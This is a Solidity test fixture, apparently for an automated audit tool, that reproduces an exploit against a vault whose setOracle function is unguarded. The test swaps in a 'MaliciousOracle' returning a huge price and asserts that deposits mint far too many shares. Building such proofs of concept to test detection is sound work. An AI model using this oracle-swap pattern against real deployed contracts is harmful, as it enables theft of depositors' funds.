// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.20;

import {PermissionlessCalleeVault} from "../src/PermissionlessCalleeVault.sol";

// #2171/#2179 pass-after: the Royco MaliciousOracle idiom. An attacker-DEPLOYED mock implementing the
// OUT-OF-SCOPE settable IOracle callee returns an ADVERSARIAL price. Because PermissionlessCalleeVault's
// setOracle is UNGUARDED, ANYONE (the attacker) can repoint the callee — no privileged role needed. Injected via
// the open setter BEFORE the attack -> the over-credit reproduces -> the exploit assertion PASSES -> the gate
// scores FINDING. The stub name is DISTINCT from the in-scope target (never a `contract PermissionlessCalleeVault`
// shadow), so the #1471 linkage gate does not read it as a target substitution.
contract MaliciousOracle {
    function price() external pure returns (uint256) {
        return 1000000000000000000000000000000;
    }
}

contract HonestBaseline {
    function price() external pure returns (uint256) {
        return 1;
    }
}

contract PocPermissionlessStub {
    function test_stub() external {
        HonestBaseline baseline = new HonestBaseline();
        PermissionlessCalleeVault vault = new PermissionlessCalleeVault(address(baseline));
        MaliciousOracle evil = new MaliciousOracle();
        // The UNGUARDED setter lets the attacker repoint the settable callee at the attacker-deployed stub.
        vault.setOracle(address(evil));
        uint256 amount = 1000;
        uint256 minted = vault.deposit(amount);
        // A hostile return value over-credits shares far beyond the honest 1:1 baseline.
        require(minted > amount * 1000000, "over-credit exploit reproduced");
    }
}
